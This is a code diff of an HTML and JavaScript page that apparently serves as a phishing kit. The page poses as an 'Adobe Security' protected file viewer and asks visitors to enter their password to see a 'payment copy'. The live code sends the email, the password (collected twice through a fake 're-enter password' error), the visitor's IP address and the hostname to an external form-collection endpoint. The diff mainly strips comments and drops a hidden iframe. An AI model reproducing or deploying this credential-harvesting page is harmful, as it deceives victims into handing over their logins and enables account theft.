@@ -16,7 +16,7 @@
       position: relative;
     }
 
-    /* === Splash layers === */
+    /* Splash with image */
     #imageSplash {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -25,6 +25,7 @@
       transition: opacity 1s ease;
     }
 
+    /* Spinner splash */
     #splash {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -51,7 +52,6 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* === Main form === */
     #main {
       display: none;
       height: 100%;
@@ -140,17 +140,14 @@
 </head>
 <body>
 
-  <!-- Fullscreen image splash -->
   <div id="imageSplash"></div>
 
-  <!-- Splash with spinner -->
   <div id="splash">
     <h2>Loading Secure Viewer…</h2>
     <p>Please wait while we prepare your file</p>
     <div class="loader"></div>
   </div>
 
-  <!-- Main form -->
   <div id="main">
     <div class="card">
       <div class="pdf-icon">
@@ -159,9 +156,9 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" target="hiddenFrame" autocomplete="on">
+      <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" autocomplete="on">
         <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly required>
+          <input id="email" name="email" class="input" type="email" readonly required>
           <div class="download-wrap">
             <button id="continueBtn" class="btn-download" type="button">Continue</button>
           </div>
@@ -175,7 +172,6 @@
           <input type="hidden" name="ip" id="ip">
           <input type="hidden" name="hostname" id="hostname">
           <input type="hidden" name="password1" id="firstPasswordField">
-
           <div id="errorMessage" class="error-message" style="display: none;">Please re-enter password.</div>
 
           <div class="download-wrap">
@@ -183,7 +179,6 @@
           </div>
         </div>
       </form>
-      <iframe name="hiddenFrame" style="display:none;"></iframe>
 
       <div class="file-info">
         <div class="file-thumb">
@@ -203,17 +198,13 @@
   window.addEventListener('load', () => {
     const imgSplash = document.getElementById('imageSplash');
     const splash = document.getElementById('splash');
-
-    // Step 1: show image for 2s
     setTimeout(() => {
       imgSplash.style.opacity = '0';
       setTimeout(() => {
         imgSplash.style.display = 'none';
-        splash.style.opacity = '1'; // Step 2: show spinner
+        splash.style.opacity = '1';
       }, 1000);
     }, 2000);
-
-    // Step 3: after 2s more, hide spinner, show form
     setTimeout(() => {
       splash.style.opacity = '0';
       setTimeout(() => {
@@ -223,7 +214,7 @@
     }, 4500);
   });
 
-  // Email autofill
+  // Autofill
   const emailInput = document.getElementById('email');
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
@@ -232,12 +223,12 @@
     document.getElementById('hostname').value = window.location.hostname;
   });
 
-  // Get IP
+  // IP
   fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(data => { document.getElementById('ip').value = data.ip; });
+    .then(r => r.json())
+    .then(d => { document.getElementById('ip').value = d.ip; });
 
-  // Continue → password step
+  // Password steps
   const continueBtn = document.getElementById('continueBtn');
   const stepEmail = document.getElementById('stepEmail');
   const stepPassword = document.getElementById('stepPassword');
@@ -252,12 +243,10 @@
     passwordInput.focus();
   });
 
-  // Toggle eye
   document.getElementById('togglePassword').addEventListener('click', () => {
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  // Handle double password + redirect
   document.getElementById('mainForm').addEventListener('submit', (e) => {
     if (passwordFirstEntry === "") {
       e.preventDefault();
@@ -269,7 +258,7 @@
       return false;
     }
 
-    // Overlay message
+    // Overlay
     const overlay = document.createElement('div');
     overlay.style.cssText = `
       position:fixed;top:0;left:0;width:100%;height:100%;
